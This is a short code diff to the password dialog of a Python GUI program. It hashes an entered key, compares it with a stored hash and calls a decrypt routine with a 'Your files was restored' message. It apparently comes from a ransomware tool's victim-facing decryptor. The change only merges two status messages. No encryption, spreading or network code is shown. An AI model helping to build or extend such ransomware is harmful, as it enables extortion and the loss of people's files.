@@ -195,8 +195,7 @@ def button_clicked(entry):
     tool.password_field = entry.get()
     pass_hash = hashlib.sha256(tool.password_field.encode()).hexdigest()
     if pass_hash == node_key_hash:
-        messagebox.showinfo(title="Success!", message="Your password is correct.")
-        phrase_b.configure(text="Please, wait for the decryption.")
+        messagebox.showinfo(title="Success!", message="Your password is correct, please, wait for the decryption. This may take some time.")
         try:
             decrypt(tool.password_field)
             messagebox.showinfo(title="Success!", message="Your files was restored. Thank you!")
